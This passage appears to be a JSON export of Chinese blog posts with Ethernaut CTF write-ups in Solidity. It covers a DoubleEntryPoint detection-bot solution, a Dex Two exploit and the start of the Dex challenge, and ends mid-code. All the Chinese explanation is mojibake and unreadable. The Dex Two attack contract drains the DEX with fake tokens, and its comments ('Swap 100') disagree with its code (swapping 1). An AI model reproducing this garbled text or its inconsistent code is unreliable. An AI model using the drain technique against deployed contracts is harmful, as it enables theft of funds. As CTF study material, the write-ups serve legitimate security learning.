åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œdelegateæ˜¯DoubleEntryPointåˆåŒæœ¬èº«ã€‚è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿå½“æ‚¨åœ¨ç°å®ä¸­æ‰§è¡Œè½¬ç§»æ—¶ï¼ŒLegacyTokenå®ƒæ­£åœ¨è½¬å‘è¦æ‰§è¡Œçš„æ“ä½œDoubleEntryPoint.delegateTransferã€‚è®©æˆ‘ä»¬åˆ‡æ¢åˆ°å¦ä¸€ä¸ªä»¤ç‰Œä»£ç ï¼Œçœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆ DoubleEntryPoint.sol12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor( address legacyToken, address vaultAddress, address fortaAddress, address playerAddress ) public &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125;&#125; åˆçº¦æ˜¯ERC20ç»§æ‰¿è‡ª å’Œ çš„DelegateERC20æ™®é€šä»£å¸Ownableã€‚DelegateERC20æ˜¯å¼ºåˆ¶åˆçº¦å®ç°tokenfunction delegateTransfer(address to, uint256 value, address origSender)éœ€è¦çš„åŠŸèƒ½çš„æ¥å£LegacyTokenã€‚ æœ‰æ—¶constructorï¼Œè®¾ç½®ä¸€äº›çŠ¶æ€å˜é‡å¹¶å°†100ä»¤ç‰Œé“¸é€ åˆ°CryptoVault. åœ¨è¿›å…¥delegateTransferå‡½æ•°ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹fortaNotifyå‡½æ•°ä¿®é¥°ç¬¦ 123456789101112131415modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);&#125; è¿™ä¸ªä¿®æ”¹å™¨çš„ä½œç”¨æ˜¯è§¦å‘ Forta æ£€æµ‹ç³»ç»Ÿå®ç°çš„ä¸€äº›é€»è¾‘ã€‚å®ƒåœ¨æœ¬åœ°å­˜å‚¨æ‰§è¡Œä»£ç å‡½æ•°ä¹‹å‰å¼•å‘çš„è­¦æŠ¥æ•°é‡ï¼Œå¹¶å°†è¯¥æ•°å­—ä¸æ‰§è¡Œè°ƒç”¨å‡½æ•°ä¿®é¥°ç¬¦çš„å‡½æ•°ä¸»ä½“ä¹‹åå¼•å‘çš„è­¦æŠ¥æ•°é‡è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœè­¦æŠ¥æ•°é‡å¢åŠ ï¼Œäº¤æ˜“å°†æ¢å¤å¹¶æ˜¾ç¤ºæ¶ˆæ¯&quot;Alert has been triggered, reverting&quot;ã€‚ è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹è°ƒç”¨LegacyTokenâ€œé—ç•™â€æ—¶ä»¤ç‰Œä¹Ÿä½¿ç”¨çš„é‡è¦åŠŸèƒ½ã€‚LegacyToken.transfer 12345678function delegateTransfer( address to, uint256 value, address origSender) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true;&#125; å¦‚æœæŸ¥çœ‹å‡½æ•°ä¿®é¥°ç¬¦åˆ—è¡¨ï¼Œæ‚¨ä¼šçœ‹åˆ° onlyDelegateFromåªå…è®¸delegateFromè°ƒç”¨æ­¤å‡½æ•°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåªLegacyTokenå…è®¸åˆçº¦è°ƒç”¨æ­¤å‡½æ•°ï¼Œå¦åˆ™å°†å…è®¸ä»»ä½•äººè°ƒç”¨_transferï¼ˆå³ä½çº§ ERC20 ä¼ è¾“ï¼‰æ¥è‡ªorigSender fortaNotifyæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„åŠŸèƒ½ä¿®é¥°ç¬¦ï¼Œå¯ä»¥è§¦å‘ä¸€äº›ç‰¹å®šçš„ Forta é€»è¾‘ï¼Œå°±åƒæˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„é‚£æ · å‡½æ•°æœ¬èº«å¾ˆç®€å•ï¼Œå°±æ˜¯è°ƒç”¨å‡½æ•°çš„ERC20å†…éƒ¨å®ç°_transferã€‚è¯·è®°ä½ï¼Œ_transferåªæ£€æŸ¥ thattoå’ŒorigSenderare notaddress(0)ä»¥åŠorigSenderæœ‰è¶³å¤Ÿçš„ä»¤ç‰Œå¯ä»¥è½¬ç§»åˆ°toï¼ˆå®ƒè¿˜æ£€æŸ¥ä¸è¶³&#x2F;æº¢å‡ºæ¡ä»¶ï¼‰ä½†å®ƒä¸æ£€æŸ¥ that origSenderismsg.senderæˆ–æ¶ˆè´¹è€…æ˜¯å¦æœ‰è¶³å¤Ÿçš„æ´¥è´´ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬æœ‰ä¿®é¥°ç¬¦onlyDelegateFromã€‚ CryptoVault.sol12345678910111213141516171819202122contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) public &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125;&#125; åˆçº¦åº”å®ç°æ™®é€šåŠ å¯† Vault ç³»ç»Ÿçš„é€»è¾‘ã€‚å¯¹äºæŒ‘æˆ˜çš„èŒƒå›´è€Œè¨€ï¼Œè¿™éƒ¨åˆ†é€»è¾‘å¹¶ä¸æœ‰è¶£ã€‚ ç”±äºä»»ä½•é‡‘åº“ä¹ŸCryptoVaultæœ‰ä¸€ä¸ªåŸºç¡€ä»¤ç‰Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯DoubleEntryPoint. ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨çš„å‡½æ•°sweepTokenå…è®¸é‡‘åº“å°†ä»»æ„tokenï¼ˆæŒ‡å®šä¸ºè¾“å…¥å‚æ•°ï¼‰çš„æ•´ä¸ªé‡‘åº“ä½™é¢è½¬ç§»åˆ°sweptTokensRecipient. æ”¶ä»¶äººåº”è¯¥æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒæ˜¯ç”±åˆåŒçš„éƒ¨ç½²è€…åŠæ—¶åˆå§‹åŒ–çš„constructorã€‚ ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œå”¯ä¸€å®Œæˆçš„æ£€æŸ¥æ˜¯é˜²æ­¢ Vault è½¬ç§»ä»¤ç‰Œunderlyingã€‚ é€šè¿‡éƒ¨ç½² Forta DetectionBot æ‰¾åˆ°æ¼æ´å¹¶é˜»æ­¢å®ƒé€šè¿‡ç»“åˆæˆ‘ä»¬æ”¶é›†åˆ°çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ‚¨æ˜¯å¦å‘ç°äº†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Ÿå›é¡¾ä¸€ä¸‹æˆ‘ä»¬ç°æœ‰çš„çŸ¥è¯†ï¼š CryptoVaultçš„underlyingä»¤ç‰Œæ˜¯DoubleEntryPointã€‚è¯¥åˆçº¦æä¾›äº†ä¸€ä¸ªsweepTokenåœ¨ Vault ä¸­è½¬ç§»ä»£å¸çš„æ–¹æ³•ï¼Œä½†å®ƒé˜»æ­¢äº†æ¸…é™¤DoubleEntryPointä»£å¸ï¼ˆå› ä¸ºå®ƒæ˜¯underlyingï¼‰ DoubleEntryPointtoken æ˜¯ä¸€ä¸ª ERC20 ä»¤ç‰Œï¼Œå®ƒå®ç°äº†ä¸€ä¸ªdelegateTransferåªèƒ½ç”±LegacyTokenä»¤ç‰Œè°ƒç”¨çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œå¹¶ä¸”ç”± Forta é€šè¿‡æ‰§è¡Œå‡½æ•°ä¿®é¥°ç¬¦æ¥ç›‘æ§fortaNotifyã€‚è¯¥å‡½æ•°å…è®¸å§”æ‰˜äººå°†ä¸€å®šæ•°é‡çš„ä»£å¸ä»origSpenderä»»æ„æ¥æ”¶è€…è½¬ç§» LegacyTokenæ˜¯å·²â€œå¼ƒç”¨â€çš„ ERC20 ä»¤ç‰Œã€‚å½“transfer(address to, uint256 value)å‡½æ•°è¢«è°ƒç”¨æ—¶DoubleEntryPointï¼Œï¼ˆä»¤ç‰Œçš„â€œæ–°ç‰ˆæœ¬â€ï¼‰delegate.delegateTransfer(to, value, msg.sender)è¢«è°ƒç”¨ é—®é¢˜åœ¨å“ªé‡Œï¼Ÿå› ä¸ºLegacyToken.transferæ˜¯â€œé•œåƒâ€ï¼ŒDoubleEntryPoint.transferè¿™æ„å‘³ç€å½“æ‚¨è¦æ±‚å°è¯•è½¬ç§» 1 ä¸ªæ—¶ï¼ŒLegacyTokenå®é™…ä¸Šæ‚¨è½¬ç§»çš„æ˜¯ 1 ä¸ªDoubleEntryPointä»£å¸ï¼ˆä¸ºäº†èƒ½å¤Ÿåšåˆ°è¿™ä¸€ç‚¹ï¼Œæ‚¨çš„ä½™é¢ä¸­å¿…é¡»åŒæ—¶æ‹¥æœ‰è¿™ä¸¤ä¸ªä»£å¸ï¼‰ åŒ…å«CryptoVaultä¸¤ä¸ªä»¤ç‰Œä¸­çš„ 100 ä¸ªï¼Œä½†sweepTokenä»…é˜»æ­¢underlying DoubleEntryPoint. ä½†æ˜¯é€šè¿‡äº†è§£å…¶å·¥ä½œåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨LegacyTokenè½»æ¾æ‰«é™¤æ‰€æœ‰ä»¤ç‰Œã€‚DoubleEntryPoint``CryptoVault.sweep(address(legacyTokenContract)) ç°åœ¨æˆ‘ä»¬çŸ¥é“å¦‚ä½•åˆ©ç”¨å®ƒï¼Œæˆ‘ä»¬å¦‚ä½•åˆ©ç”¨ Forta é›†æˆæ¥é˜²æ­¢åˆ©ç”¨å¹¶æ¢å¤äº¤æ˜“ï¼Ÿæˆ‘ä»¬å¯ä»¥æ„å»ºä¸€ä¸ªæ‰©å±• Forta çš„åˆçº¦IDetectionBotå¹¶å°†å…¶æ’å…¥DoubleEntryPoint. é€šè¿‡è¿™æ ·åšï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿåœ¨ VaultsweepTokenè§¦å‘LegacyToken.transferå°†è§¦å‘DoubleEntryPoint.delegateTransferå°†è§¦å‘ï¼ˆåœ¨æ‰§è¡Œå‡½æ•°ä»£ç ä¹‹å‰ï¼‰å‡½æ•°fortaNotifyä¿®é¥°ç¬¦æ—¶é˜²æ­¢åˆ©ç”¨ã€‚æ˜¯çš„ï¼Œæˆ‘çŸ¥é“æ‰§è¡Œé“¾å¾ˆæ·±ï¼Œä½†è¯·è€å¿ƒç­‰å¾…ï¼Œæˆ‘ä»¬æ˜ç™½äº†ï¼ åˆçº¦IDetectionBotæ¥å£åªæœ‰ä¸€ä¸ªå‡½æ•°ç­¾åfunction handleTransaction(address user, bytes calldata msgData) external;ï¼Œå¯ä»¥é€šè¿‡DoubleEntryPoint.delegateTransferè¿™äº›å‚æ•°ç›´æ¥è°ƒç”¨forta.notify(player, msg.data)ã€‚ åªæœ‰åœ¨è¿™ä¸¤ä¸ªæ¡ä»¶éƒ½ä¸ºçœŸæ—¶ï¼Œæˆ‘ä»¬æ‰ä¼šåœ¨å†…éƒ¨DetectionBotå‘å‡ºè­¦æŠ¥ï¼š åŸå§‹å‘ä»¶äººï¼ˆæ­£åœ¨å‘¼å«çš„äººDoubleEntryPoint.delegateTransferï¼‰æ˜¯CryptoVault è°ƒç”¨å‡½æ•°çš„ç­¾åï¼ˆçš„å‰ 4 ä¸ªå­—èŠ‚calldataï¼‰ç­‰äºdelegateTransferç­¾å è®©æˆ‘ä»¬origSenderä»ä¸­æå–å€¼msgDataï¼ˆè¯·è®°ä½ï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œè¯¥å‚æ•°å€¼ç­‰äºmsg.dataï¼‰ã€‚å¦‚æœæ‚¨æŸ¥çœ‹â€œç‰¹æ®Šå˜é‡å’Œå‡½æ•°â€éƒ¨åˆ†ä¸‹çš„å—å’Œäº¤æ˜“å±æ€§msg.dataçš„ Solidity æ–‡æ¡£ï¼Œæ‚¨ä¼šçœ‹åˆ°è¿™æ˜¯ä¸€ç§ä»£è¡¨å®Œæ•´ calldata çš„bytes calldataæ•°æ®ç±»å‹ã€‚è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿåœ¨è¿™äº›å­—èŠ‚ä¸­ï¼Œæ‚¨å°†åŒæ—¶æ‹¥æœ‰å‡½æ•°é€‰æ‹©å™¨ï¼ˆ4 ä¸ªå­—èŠ‚ï¼‰å’Œå‡½æ•°æœ‰æ•ˆè´Ÿè½½ã€‚ è¦æå–å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä½¿ç”¨abi.decodeè¿™æ ·çš„(address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address));ã€‚ä¸€ä¸ªé‡è¦çš„æ³¨æ„äº‹é¡¹ï¼šæˆ‘ä»¬å‡è®¾åœ¨è¿™äº›å­—èŠ‚ä¸­ï¼Œè¿™äº›ç‰¹å®šç±»å‹çš„ä¸‰ä¸ªå€¼ä»¥è¿™äº›ç‰¹å®šé¡ºåºæ’åˆ—ã€‚æˆ‘ä»¬æ­£åœ¨åšä¸€ä¸ªéå¸¸è‰°éš¾çš„å‡è®¾ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦å°†æ­¤ä¿¡æ¯ä¸å‡½æ•°ç­¾åä¸å¼ºåˆ¶æ‰§è¡Œè¿™äº›ç±»å‹å’Œé¡ºåºè¦æ±‚çš„å‡½æ•°ç­¾åç›¸åŒ¹é…è¿™ä¸€äº‹å®ç»“åˆèµ·æ¥delegateTransferã€‚ 1msgData`ç¬¬äºŒéƒ¨åˆ†éå¸¸ç®€å•ï¼Œæˆ‘ä»¬åªéœ€é€šè¿‡åˆå¹¶å‰ 4 ä¸ªå­—èŠ‚æ¥é‡å»ºè°ƒç”¨ç­¾åï¼Œ`bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]);`å¹¶å°†å…¶ä¸æˆ‘ä»¬çŸ¥é“çš„æ­£ç¡®ç­¾åè¿›è¡Œæ¯”è¾ƒ`delegateTransfer`â†’`abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) è§£å†³æ–¹æ¡ˆä»£ç è®©æˆ‘ä»¬çœ‹çœ‹æ£€æµ‹çš„æ•´ä¸ªä»£ç DetectionBot 12345678910111213141516171819contract DetectionBot is IDetectionBot &#123; address private monitoredSource; bytes private monitoredSig; constructor(address _monitoredSource, bytes memory _monitoredSig) public &#123; monitoredSource = _monitoredSource; monitoredSig = _monitoredSig; &#125; function handleTransaction(address user, bytes calldata msgData) external override &#123; (address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address)); bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]); if (origSender == monitoredSource &amp;&amp; keccak256(callSig) == keccak256(monitoredSig)) &#123; IForta(msg.sender).raiseAlert(user); &#125; &#125;&#125; åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°†æ˜¯æˆ‘ä»¬è¦ç›‘è§†çš„æºï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯åœ°å€ï¼ŒCryptoVaultç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬æ‰“ç®—ç›‘è§†çš„å‡½æ•°çš„ç­¾åï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;)ã€‚ ç°åœ¨æˆ‘ä»¬åªéœ€è¦éƒ¨ç½²ä¼ é€’æ­£ç¡®å‚æ•°çš„æœºå™¨äººå¹¶å°†æœºå™¨äººæ’å…¥ Forta ç³»ç»Ÿå¹¶è§£å†³æŒ‘æˆ˜ã€‚æˆ‘ä»¬èµ°å§ï¼ 12345678910111213141516function exploitLevel() internal override &#123; vm.startPrank(player, player); // Create and deploy the `DetectionBot` with the correct constructor paramter // The first one is the source we want to monitor // The second one is the signature of the function we want to match DetectionBot bot = new DetectionBot( level.cryptoVault(), abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) ); // add the bot to the Forta network detection system that monitor the `DoubleEntryPoint` contract level.forta().setDetectionBot(address(bot)); vm.stopPrank();&#125; 3. è§£é¢˜","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Dex Two","slug":"CTFS/ethernaut/Dex Two","date":"2023-03-11T04:15:10.000Z","updated":"2023-03-11T04:15:10.000Z","comments":true,"path":"2023/03/11/CTFS/ethernaut/Dex Two/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/11/CTFS/ethernaut/Dex%20Two/","excerpt":"","text":"Dex Two1. é¢˜ç›®è¦æ±‚ 1.1 This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way. You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level. You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token. Things that might help: é¢˜ç›®ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;contract DexTwo is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function add_liquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableTokenTwo(token1).approve(msg.sender, spender, amount); SwappableTokenTwo(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125;&#125;contract SwappableTokenTwo is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125;&#125; 2. åˆ†ætipsï¼šå‚è€ƒåšå®¢ 2.1 åˆ†æåˆçº¦ï¼š swap å‡½æ•° ï¼š 1234567891011function swap( address from, address to, uint256 amount) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount);&#125; å½“å‰swapå‡½æ•°ä¸æ£€æŸ¥fromï¼Œå®é™…ä¸Šæ˜¯åˆçº¦å¤„ç†çš„toç™½åå•token1å’Œä»£å¸ã€‚token2``DexTwo è¿™æ˜¯è¯¥å‡½æ•°å…ˆå‰ç‰ˆæœ¬ä¸­å­˜åœ¨çš„æ£€æŸ¥ï¼šrequire((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿè¿™å…è®¸æ”»å‡»è€…è°ƒç”¨è¯¥swapå‡½æ•°ï¼Œå‡ºå”®ä»»æ„ ä»¤ç‰Œä»¥ä» Dexfromè·å–â€œçœŸå®â€ä»¤ç‰Œã€‚toè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªUselessERC20å®Œå…¨ç”±æˆ‘ä»¬æ‹¥æœ‰å’Œç®¡ç†çš„å…¨æ–°ä»£å¸ï¼ˆæˆ‘ä»¬å¯ä»¥é“¸é€ ã€é”€æ¯ã€åšä»»ä½•æˆ‘ä»¬æƒ³åšçš„äº‹ï¼‰å¹¶è·å¾—ä¸€äº›token1æˆ–token2å…è´¹è·å¾—ã€‚ æˆ‘ä»¬å¯ä»¥è€—å°½DexTwoåˆåŒtoken1å¹¶token2å„æ‰“ä¸€æ¬¡ç”µè¯å—ï¼Ÿä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ­£ç¡®çš„fakeTokenå–å‡ºæ•°é‡ä»¥å–å› 100 token1ã€‚ åšæ•°å­¦è®¡ç®—ï¼Œçœ‹ä¸€ä¸‹getSwapAmountå‡½æ•° 100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken 100 token1 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken 123456 - æˆ‘ä»¬æœ‰ä¸¤ä¸ªå¯ä»¥æ§åˆ¶çš„å˜é‡ã€‚æˆ‘ä»¬è‚¯å®šçŸ¥é“å®ƒ`DexBalanceOfFakeToken`å¿…é¡»**&gt; 1**å¦åˆ™äº¤æ˜“å°†å› ä¸ºè¢«**0 é™¤**è€Œæ¢å¤ã€‚å¦‚æœæˆ‘ä»¬å‘é€ 1`FakeToken`ç»™`DexTwo`æˆ‘ä»¬ - &gt; ```unknown100 token1 = amountOfFakeTokenToSell * 100 / 11 token1 = amountOfFakeTokenToSell å› æ­¤ï¼Œé€šè¿‡1 FakeToken1å‘DexTwoåˆçº¦å‘é€ç»™å®ƒä¸€äº›æµåŠ¨æ€§ï¼Œæˆ‘ä»¬å¯ä»¥äº¤æ¢ 100FakeTokenä»¥å–å› 100 token1ã€‚ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹å¦ä¸€ä¸ªå®ä¾‹é‡å¤ç›¸åŒçš„æ“ä½œï¼Œå¹¶ä» Dex ä¸­FakeToken2æ’å‡ºæ‰€æœ‰çš„ã€‚token2 æ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829function exploitLevel() internal override &#123; vm.startPrank(player, player); // Deploy a fake token based on the SwappableTokenTwo contract // Mint 10k tokens and send them to the player (msg.sender) SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); // Approve the dex to manage all of our token token1.approve(address(level), 2**256 - 1); token2.approve(address(level), 2**256 - 1); fakeToken1.approve(address(level), 2**256 - 1); fakeToken2.approve(address(level), 2**256 - 1); // send 1 fake token to the DexTwo to have at least 1 of liquidity ERC20(fakeToken1).transfer(address(level), 1); ERC20(fakeToken2).transfer(address(level), 1); // Swap 100 fakeToken1 to get 100 token1 level.swap(address(fakeToken1), address(token1), 1); // Swap 100 fakeToken2 to get 100 token2 level.swap(address(fakeToken2), address(token2), 1); // Assert that we have drained the Dex contract assertEq(token1.balanceOf(address(level)) == 0 &amp;&amp; token2.balanceOf(address(level)) == 0, true); vm.stopPrank();&#125; 3. è§£é¢˜","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Dex","slug":"CTFS/ethernaut/Dex","date":"2023-03-10T02:17:10.000Z","updated":"2023-03-10T02:17:10.000Z","comments":true,"path":"2023/03/10/CTFS/ethernaut/Dex/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/10/CTFS/ethernaut/Dex/","excerpt":"","text":"Dex1. é¢˜ç›®è¦æ±‚ 1.1 æ­¤é¢˜ç›®çš„ç›®æ ‡æ˜¯è®©æ‚¨ç ´è§£ä¸‹é¢çš„åŸºæœ¬åˆçº¦å¹¶é€šè¿‡ä»·æ ¼æ“çºµçªƒå–èµ„é‡‘ã€‚ ä¸€å¼€å§‹æ‚¨å¯ä»¥å¾—åˆ°10ä¸ªtoken1å’Œtoken2ã€‚åˆçº¦ä»¥æ¯ä¸ªä»£å¸100ä¸ªå¼€å§‹ã€‚ å¦‚æœæ‚¨è®¾æ³•ä»åˆçº¦ä¸­å–å‡ºä¸¤ä¸ªä»£å¸ä¸­çš„è‡³å°‘ä¸€ä¸ªï¼Œå¹¶è®©åˆçº¦å¾—åˆ°ä¸€ä¸ªçš„â€œåâ€çš„tokenä»·æ ¼ï¼Œæ‚¨å°†åœ¨æ­¤çº§åˆ«ä¸Šå–å¾—æˆåŠŸã€‚ æ³¨æ„ï¼š é€šå¸¸ï¼Œå½“æ‚¨ä½¿ç”¨ERC20ä»£å¸è¿›è¡Œäº¤æ¢æ—¶ï¼Œæ‚¨å¿…é¡»approveåˆçº¦æ‰èƒ½ä¸ºæ‚¨ä½¿ç”¨ä»£å¸ã€‚ä¸ºäº†ä¸é¢˜ç›®çš„è¯­æ³•ä¿æŒä¸€è‡´ï¼Œæˆ‘ä»¬åˆšåˆšå‘åˆçº¦æœ¬èº«æ·»åŠ äº†approveæ–¹æ³•ã€‚å› æ­¤ï¼Œè¯·éšæ„ä½¿ç”¨ contract.approve(contract.address, ) è€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ä»£å¸ï¼Œå®ƒä¼šè‡ªåŠ¨æ‰¹å‡†å°†ä¸¤ä¸ªä»£å¸èŠ±è´¹æ‰€éœ€çš„é‡‘é¢ã€‚ è¯·å¿½ç•¥SwappableTokenåˆçº¦ã€‚ å¯èƒ½æœ‰å¸®åŠ©çš„æ³¨æ„ç‚¹ï¼š ä»£å¸çš„ä»·æ ¼æ˜¯å¦‚ä½•è®¡ç®—çš„ï¼Ÿ approveæ–¹æ³•å¦‚ä½•å·¥ä½œï¼Ÿ æ‚¨å¦‚ä½•æ‰¹å‡†ERC20 çš„äº¤æ˜“ï¼Ÿ 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;contract Dex is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function addLiquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address 